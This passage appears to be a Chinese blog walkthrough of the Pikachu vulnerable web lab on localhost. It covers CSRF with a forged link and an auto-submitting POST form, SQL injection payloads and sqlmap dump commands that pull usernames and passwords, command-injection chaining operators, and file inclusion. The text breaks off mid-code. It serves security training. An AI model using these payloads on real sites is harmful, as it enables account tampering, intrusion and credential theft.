href="https://tech.meituan.com/2018/09/27/fe-security.html">https://tech.meituan.com/2018/09/27/fe-security.html</a></p><h2 id="CSRF（跨站请求伪造）"><a href="#CSRF（跨站请求伪造）" class="headerlink" title="CSRF（跨站请求伪造）"></a>CSRF（跨站请求伪造）</h2><blockquote><p>CSRF(跨站请求伪造)概述</p><p>Cross-site request forgery 简称为“CSRF”，在CSRF的攻击场景中攻击者会伪造一个请求（这个请求一般是一个链接），然后欺骗目标用户进行点击，用户一旦点击了这个请求，整个攻击就完成了。所以CSRF攻击也成为”one click”攻击。 很多人搞不清楚CSRF的概念，甚至有时候会将其和XSS混淆,更有甚者会将其和越权问题混为一谈,这都是对原理没搞清楚导致的。<br>这里列举一个场景解释一下，希望能够帮助你理解。<br><strong>场景需求：</strong><br>小黑想要修改大白在购物网站tianxie<a href="http://www.xx.com上填写的会员地址./">www.xx.com上填写的会员地址。</a><br><strong>先看下大白是如何修改自己的密码的：</strong><br>登录—修改会员信息，提交请求—修改成功。<br>所以小黑想要修改大白的信息，他需要拥有：1，登录权限 2，修改个人信息的请求。</p><p>但是大白又不会把自己xxx网站的账号密码告诉小黑，那小黑怎么办？<br>于是他自己跑到<a href="http://www.xx.com上注册了一个自己的账号，然后修改了一下自己的个人信息（比如：E-mail地址），他发现修改的请求是：">www.xx.com上注册了一个自己的账号，然后修改了一下自己的个人信息（比如：E-mail地址），他发现修改的请求是：</a><br>【<a href="http://www.xxx.com/edit.php?email=xiaohei@88.com&amp;Change=Change%E3%80%91">http://www.xxx.com/edit.php?email=xiaohei@88.com&amp;Change=Change】</a><br>于是，他实施了这样一个操作：把这个链接伪装一下，在小白登录xxx网站后，欺骗他进行点击，小白点击这个链接后，个人信息就被修改了,小黑就完成了攻击目的。</p><p><strong>为啥小黑的操作能够实现呢。有如下几个关键点：</strong><br>1.<a href="http://www.xxx.com这个网站在用户修改个人的信息时没有过多的校验,导致这个请求容易被伪造/">www.xxx.com这个网站在用户修改个人的信息时没有过多的校验，导致这个请求容易被伪造</a>;<br>—因此，我们判断一个网站是否存在CSRF漏洞，其实就是判断其对关键信息（比如密码等敏感信息）的操作(增删改)是否容易被伪造。<br>2.小白点击了小黑发给的链接，并且这个时候小白刚好登录在购物网上;<br>—如果小白安全意识高，不点击不明链接，则攻击不会成功，又或者即使小白点击了链接，但小白此时并没有登录购物网站，也不会成功。<br>—因此，要成功实施一次CSRF攻击，需要“天时，地利，人和”的条件。<br>当然，如果小黑事先在xxx网的首页如果发现了一个XSS漏洞，则小黑可能会这样做： 欺骗小白访问埋伏了XSS脚本（盗取cookie的脚本）的页面，小白中招，小黑拿到小白的cookie，然后小黑顺利登录到小白的后台，小黑自己修改小白的相关信息。<br>—所以跟上面比一下，就可以看出CSRF与XSS的区别：CSRF是借用户的权限完成攻击，攻击者并没有拿到用户的权限，而XSS是直接盗取到了用户的权限，然后实施破坏。</p><p>因此，网站如果要防止CSRF攻击，则需要对敏感信息的操作实施对应的安全措施，防止这些操作出现被伪造的情况，从而导致CSRF。比如：<br><strong>–对敏感信息的操作增加安全的token；</strong><br><strong>–对敏感信息的操作增加安全的验证码；</strong><br><strong>–对敏感信息的操作实施安全的逻辑流程，比如修改密码时，需要先校验旧密码等。</strong></p></blockquote><h3 id="CSRF-get"><a href="#CSRF-get" class="headerlink" title="CSRF(get)"></a>CSRF(get)</h3><p>先登录进去</p><p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/image-20210211093728691.png"></p><p>修改提交的时候抓包</p><p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/image-20210211094138876.png"></p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;127.0.0.1&#x2F;pikachu&#x2F;vul&#x2F;csrf&#x2F;csrfget&#x2F;csrf_get_edit.php?sex&#x3D;girl&amp;phonenum&#x3D;111111&amp;add&#x3D;CHINA&amp;email&#x3D;lucy%40qq.com&amp;submit&#x3D;submit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>修URL然后发给别人，只要他在登录状态下点了这个链接，他的信息就被修改了</p><h3 id="CSRF-post"><a href="#CSRF-post" class="headerlink" title="CSRF(post)"></a>CSRF(post)</h3><p>还是一样登录，修改信息，抓包。但这次修改信息是在一个POST表单里,不能直接改URL了</p><p>查了一下发现一般可以自己搭一个站点，然后将POST请求隐藏在站点的表单里，当用户点击后数据就被POST到有CSRF漏洞的网站</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">window<span class="token punctuation">.</span><span class="token function-variable function">onload</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"postsubmit"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">click</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>localhost/pikachu/vul/csrf/csrfpost/csrf_post_edit.php<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>sex<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>sex<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>body<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>phonenum<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>phonenum<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>123456789<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>add<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>add<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>usa<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>email<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>email<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>vince@pikachu.com<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>postsubmit<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这个构造的网页也可以用CSRFTester抓包来生成</p><p>把这个存为一个html文件，放到网站目录下，如果有人在登录状态下点进了这个网页并提交了，他的信息就会被改成我们事先准备好的</p><h3 id="CSRF-Token"><a href="#CSRF-Token" class="headerlink" title="CSRF(Token)"></a>CSRF(Token)</h3><p>抓包的时候发现和前面的比较，多了一个令牌。每次请求时都增加一个不容易伪造的随机字符串，后台再对令牌进行校验</p><p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/image-20210214100609125.png"></p><p>由于token是随机的，所以伪造不了了</p><h2 id="SQL-Inject（SQL注入）"><a href="#SQL-Inject（SQL注入）" class="headerlink" title="SQL-Inject（SQL注入）"></a>SQL-Inject（SQL注入）</h2><blockquote><p>SQL注入漏洞主要形成的原因是在数据交互中，前端的数据传入到后台处理时，没有做严格的判断，导致其传入的“数据”拼接到SQL语句中后，被当作SQL语句的一部分执行。 从而导致数据库受损（被脱裤、被删除、甚至整个服务器权限沦陷）。</p><p>在构建代码时，一般会从如下几个方面的策略来防止SQL注入漏洞：<br>1.对传进SQL语句里面的变量进行过滤，不允许危险字符传入；<br>2.使用参数化（Parameterized Query 或 Parameterized Statement）；<br>3.还有就是,目前有很多ORM框架会自动使用参数化解决注入问题,但其也提供了”拼接”的方式,所以使用时需要慎重!</p></blockquote><h3 id="数字型注入（post）"><a href="#数字型注入（post）" class="headerlink" title="数字型注入（post）"></a>数字型注入（post）</h3><p>抓包重发，</p><p>加个<code>‘</code>判断注入类别</p><p>判断字段数</p><p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/image-20210214154622070.png"></p><p>下面就不一一放图了</p><p>payload</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">id<span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token number">2</span> <span class="token comment">#字段数为2</span>id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span> <span class="token comment">#查看显位</span>id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">#爆库（pikachu）</span>id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">#爆表</span>id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">where</span> table_name<span class="token operator">=</span><span class="token string">'users'</span> <span class="token comment">#爆字段</span>id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>username<span class="token punctuation">,</span><span class="token string">':'</span><span class="token punctuation">,</span>password<span class="token punctuation">)</span> <span class="token keyword">from</span> users <span class="token comment">#爆值</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/image-20210214160143419.png"></p><h3 id="字符型注入（get）"><a href="#字符型注入（get）" class="headerlink" title="字符型注入（get）"></a>字符型注入（get）</h3><p>常规套路</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">#1.判断注入类型</span><span class="token number">1</span><span class="token number">1</span><span class="token string">'#2.判断字段数1'</span> <span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token number">3</span> <span class="token comment"># </span><span class="token comment">#3.查看显位</span><span class="token operator">-</span><span class="token number">1</span><span class="token string">' union select 1,2 # #4.爆库-1'</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment"># </span><span class="token comment">#5.爆表</span><span class="token operator">-</span><span class="token number">1</span><span class="token string">' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() ##6.爆字段-1'</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">where</span> table_name<span class="token operator">=</span><span class="token string">'users'</span> <span class="token comment">#</span><span class="token comment">#7.爆值</span><span class="token operator">-</span><span class="token number">1</span><span class="token string">' union select 1,concat_ws('</span><span class="token operator">-</span>'<span class="token punctuation">,</span>username<span class="token punctuation">,</span>password<span class="token punctuation">)</span> <span class="token keyword">from</span> users <span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/image-20210214180536040.png"></p><h3 id="搜索型注入"><a href="#搜索型注入" class="headerlink" title="搜索型注入"></a>搜索型注入</h3><blockquote><p>到这里变量类型拼接类型多种多样，只要成功把闭合构造出来就行</p></blockquote><p>第一次遇到搜索型注入</p><p>语句格式</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> username <span class="token keyword">from</span> <span class="token keyword">user</span> <span class="token keyword">where</span> username <span class="token operator">like</span> <span class="token string">'%&#123;$username&#125;%'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>构造合法语句</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">xxx<span class="token operator">%</span>' <span class="token operator">or</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span> <span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/image-20210214183952763.png"></p><h3 id="xx型注入"><a href="#xx型注入" class="headerlink" title="xx型注入"></a>xx型注入</h3><p>查看源码</p><p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/image-20210214184354419.png"></p><p>payload</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">xx'<span class="token punctuation">)</span> <span class="token operator">or</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span> <span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="“insert-update”注入"><a href="#“insert-update”注入" class="headerlink" title="“insert/update”注入"></a>“insert/update”注入</h3><p>进入注册页面，推测在用户名或者密码那可能存在注入漏洞</p><p>随便输入看看报错</p><pre class="line-numbers language-none"><code class="language-none">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;\&#39;),&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;)&#39; at line 1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>试了几种常见的，发现报错注入可以</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">Amy<span class="token string">' and updatexml(1,concat(0x7e,database()),0) or '</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/image-20210214185323297.png"></p><h3 id="“delete”注入"><a href="#“delete”注入" class="headerlink" title="“delete”注入"></a>“delete”注入</h3><p>随便放点留言进去，根据题意</p><p>点删除的时候抓包</p><p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/image-20210214190707576.png"></p><p>应该就是在这里注入</p><p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/image-20210214190857537.png"></p><h3 id="“http-header”注入"><a href="#“http-header”注入" class="headerlink" title="“http header”注入"></a>“http header”注入</h3><p>登录之后得到</p><pre class="line-numbers language-none"><code class="language-none">你的ip地址:127.0.0.1你的user agent:Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko&#x2F;20100101 Firefox&#x2F;85.0你的http accept:text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8你的端口（本次连接）:tcp2211<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>似曾相识啊</p><p>这个和sqli-labs后面那几个独特的注入点差不多</p><p>试了下<strong>User-Agent、Accept、Cookie</strong>都可以注入</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span><span class="token string">' and extractvalue(1,concat(0x7e,database())) and '</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="盲注-base-on-boolean"><a href="#盲注-base-on-boolean" class="headerlink" title="盲注(base on boolean)"></a>盲注(base on boolean)</h3><blockquote><p>布尔盲注和时间盲注只能一个一个去猜，在不知道数据库信息的情况下手工去做非常的浪费时间</p><p>这里可以直接用sqlmap或者写点py脚本来做</p></blockquote><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">python sqlmap.py -u <span class="token string">"http://127.0.0.1/pikachu/vul/sqli/sqli_blind_b.php?name=1&amp;submit=%E6%9F%A5%E8%AF%A2"</span> -D pikachu -T <span class="token function">users</span> -C username,password --dump --batch --threads <span class="token number">10</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/image-20210214195143311.png"></p><h3 id="盲注-base-on-time"><a href="#盲注-base-on-time" class="headerlink" title="盲注(base on time)"></a>盲注(base on time)</h3><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">#时间盲注</span>kobe<span class="token string">' and if((substr(database(),1,1))='</span>p'<span class="token punctuation">,</span>sleep<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token boolean">null</span><span class="token punctuation">)</span><span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/image-20210214192508708.png"></p><p>直接上sqlmap</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">python sqlmap.py -u <span class="token string">"http://127.0.0.1/pikachu/vul/sqli/sqli_blind_t.php?name=1&amp;submit=%E6%9F%A5%E8%AF%A2#"</span> --technique T -D pikachu -T <span class="token function">users</span> -C username,password --dump --batch --threads <span class="token number">10</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>有点小慢，正在一个一个字符的试</p><p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/image-20210214195819281.png"></p><h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h3><blockquote><ol><li><p>字符、字符集<br>字符(character)是组成字符集(character set)的基本单位。对字符赋予一个数值(encoding)来确定这个字符在该字符集中的位置。</p></li><li><p>UTF8<br>由于ASCII表示的字符只有128个，因此网络世界的规范是使用UNICODE编码，但是用ASCII表示的字符使用UNICODE并不高效。因此出现了中间格式字符集，被称为通用转换格式，及UTF(Universal Transformation Format)。</p></li><li><p>宽字节<br>GB2312、GBK、GB18030、BIG5、Shift_JIS等这些都是常说的宽字节，实际上只有两字节。宽字节带来的安全问题主要是吃ASCII字符(一字节)的现象，即将两个ascii字符误认为是一个宽字节字符。</p><p><strong>MySQL字符集转换过程</strong></p></li><li><p>MySQL Server收到请求时将请求数据从character_set_client转换为character_set_connection</p></li><li><p>进行内部操作前将请求数据从character_set_connection转换为内部操作字符集，其确定方法如下：</p><ul><li>使用每个数据字段的CHARACTER SET设定值</li><li>若上述值不存在，则使用对应数据表的DEFAULT CHARACTER SET设定值(MySQL扩展，非SQL标准)</li><li>若上述值不存在，则使用对应数据库的DEFAULT CHARACTER SET设定值</li><li>若上述值不存在，则使用character_set_server设定值</li></ul></li><li><p>将操作结果从内部操作字符集转换为character_set_results</p></li></ol><p>宽字节注入发生的位置就是PHP发送请求到MYSQL时字符集使用character_set_client设置值进行了一次编码</p><p><strong>宽字节注入原理</strong></p><p>GBK占两个字节</p><p>ASCII占一个字节</p><p>PHP编码为GBK，函数执行添加的是ASCII编码（添加的符号为”&quot;)，MySQL默认字符集是GBK等宽字符集</p><p>当PHP转义（开启GPC、用addslashes函数，或者icov等）时，单引号会被加上反斜杠<code>\</code>，结果就是<code>\&#39;</code>，十六进制编码为<code>%5c%27</code>，如果在PHP转移前，单引号前加上<code>%df</code>，结果就是<code>%df%5c%27</code>，其中<code>%df%5c</code>会被当成宽字符编码，变成<code>縗</code></p><p>也就是<code>%df\&#39;</code>= <code>%df%5c%27</code>=<code>縗&#39;</code>，就有了单引号，方便注入</p></blockquote><p>这里post传参</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">#查询数据库 </span><span class="token operator">-</span><span class="token number">1</span><span class="token operator">%</span>df<span class="token string">' union select 1,database() --+ #查询表名 -1%df'</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">--+ </span><span class="token comment">#查询字段名 -1%df' union select 1, group_concat(column_name) from information_schema.columns where table_name=0x7573657273 --+ </span>这里表名table_name的值必须转换成<span class="token number">16</span>进制，如果不用<span class="token number">16</span>进制就得用引号包裹，当有addlashes函数就会转义引号，就会导致查询失败，使用<span class="token number">16</span>进制避免了这个问题。 <span class="token comment">#查询字段信息 </span><span class="token operator">-</span><span class="token number">1</span><span class="token operator">%</span>df' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>username<span class="token punctuation">,</span><span class="token number">0x3a</span><span class="token punctuation">,</span>password<span class="token punctuation">)</span> <span class="token keyword">from</span> users <span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/image-20210214201047814.png"></p><h2 id="REC（远程代码执行）"><a href="#REC（远程代码执行）" class="headerlink" title="REC（远程代码执行）"></a>REC（远程代码执行）</h2><blockquote><p><strong>远程系统命令执行</strong><br>一般出现这种漏洞，是因为应用系统从设计上需要给用户提供指定的远程命令操作的接口比如我们常见的路由器、防火墙、入侵检测等设备的web管理界面上一般会给用户提供一个ping操作的web界面，用户从web界面输入目标IP，提交后，后台会对该IP地址进行一次ping测试，并返回测试结果。                        而，如果，设计者在完成该功能时，没有做严格的安全控制，则可能会导致攻击者通过该接口提交“意想不到”的命令，从而让后台进行执行，从而控制整个后台服务器                        </p><p>现在很多的甲方企业都开始实施自动化运维,大量的系统操作会通过”自动化运维平台”进行操作。                        在这种平台上往往会出现远程系统命令执行的漏洞,不信的话现在就可以找你们运维部的系统测试一下,会有意想不到的”收获”-_-                    </p><p><strong>远程代码执行</strong><br>同样的道理,因为需求设计,后台有时候也会把用户的输入作为代码的一部分进行执行,也就造成了远程代码执行漏洞。不管是使用了代码执行的函数,还是使用了不安全的反序列化等等。因此，如果需要给前端用户提供操作类的API接口，一定需要对接口输入的内容进行严格的判断，比如实施严格的白名单策略会是一个比较好的方法。                    </p></blockquote><h4 id="转义字符"><a href="#转义字符" class="headerlink" title="转义字符"></a>转义字符</h4><p><strong>windows</strong>:<code>^</code></p><p><strong>linuxL</strong>:<code>\</code></p><h4 id="命令拼接符"><a href="#命令拼接符" class="headerlink" title="命令拼接符"></a>命令拼接符</h4><p><strong>windows</strong></p><ol><li><p><strong><code>“|”</code> 管道符，前面命令标准输出，后面命令的标准输入</strong></p></li><li><p><strong><code>“&amp;”</code> commandA &amp; commandB 先运行命令A然后运行命令B</strong></p></li><li><p><strong><code>“||”</code> commandA || commandB 运行命令A，如果失败则运行命令B</strong></p></li><li><p><strong><code>“&amp;&amp;”</code> commandA &amp;&amp; commandB 运行命令A，如果成功则运行命令B</strong></p><p><strong>linux</strong></p></li><li><p><strong><code>“|”</code> 管道符，前面命令标准输出，后面命令的标准输入</strong></p></li><li><p><strong><code>“&amp;”</code> commandA &amp; commandB 先运行命令A然后运行命令B</strong></p></li><li><p><strong><code>“||”</code> commandA || commandB 运行命令A，如果失败则运行命令B</strong></p></li><li><p><strong><code>“&amp;&amp;”</code> commandA &amp;&amp; commandB 运行命令A，如果成功则运行命令B</strong></p></li><li><p><strong><code>“;”</code> commandA;commandB执行完A执行B</strong></p></li><li><p><strong><code>“%0a”</code> 换行符</strong></p></li><li><p><strong><code>“%0d”</code> 回车符</strong></p></li></ol><h4 id="执行函数"><a href="#执行函数" class="headerlink" title="执行函数"></a>执行函数</h4><p><strong>在PHP中，可以执行命令的函数有：</strong></p><p><strong><code>system、exec、shell_exec、passthru、pcntl_exec、popen、proc_popen等</code></strong></p><h4 id="注释函数"><a href="#注释函数" class="headerlink" title="注释函数"></a>注释函数</h4><p><strong>windows</strong>:<code>::</code></p><p><strong>linux</strong>:<code>#</code></p><h2 id="File-Inclusion（文件包含）"><a href="#File-Inclusion（文件包含）" class="headerlink" title="File Inclusion（文件包含）"></a>File Inclusion（文件包含）</h2><blockquote><p>文件包含，是一个功能。在各种开发语言中都提供了内置的文件包含函数，其可以使开发人员在一个代码文件中直接包含（引入）另外一个代码文件。比如 在PHP中，提供了：<br>include(),include_once()<br>require(),require_once()<br>这些文件包含函数，这些函数在代码设计中被经常使用到。<br>大多数情况下，文件包含函数中包含的代码文件是固定的，因此也不会出现安全问题。但是，有些时候，文件包含的代码文件被写成了一个变量，且这个变量可以由前端用户传进来，这种情况下，如果没有做足够的安全考虑，则可能会引发文件包含漏洞。攻击着会指定一个“意想不到”的文件让包含函数去执行，从而造成恶意操作。根据不同的配置环境，文件包含漏洞分为如下两种情况：<br><strong>1.本地文件包含漏洞：</strong>仅能够对服务器本地的文件进行包含，由于服务器上的文件并不是攻击者所能够控制的，因此该情况下，攻击着更多的会包含一些固定的系统配置文件，从而读取系统敏感信息。很多时候本地文件包含漏洞会结合一些特殊的文件上传漏洞，从而形成更大的威力。<br><strong>2.远程文件包含漏洞：</strong>能够通过url地址对远程的文件进行包含，这意味着攻击者可以传入任意的代码，这种情况没啥好说的，准备挂彩。                    </p><p>因此，在web应用系统的功能设计上尽量不要让前端用户直接传变量给包含函数，如果非要这么做，也一定要做严格的白名单策略进行过滤。                   </p></blockquote><h3 id="Local"><a href="#Local" class="headerlink" title="Local"></a>Local</h3><p><strong>源码</strong></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token 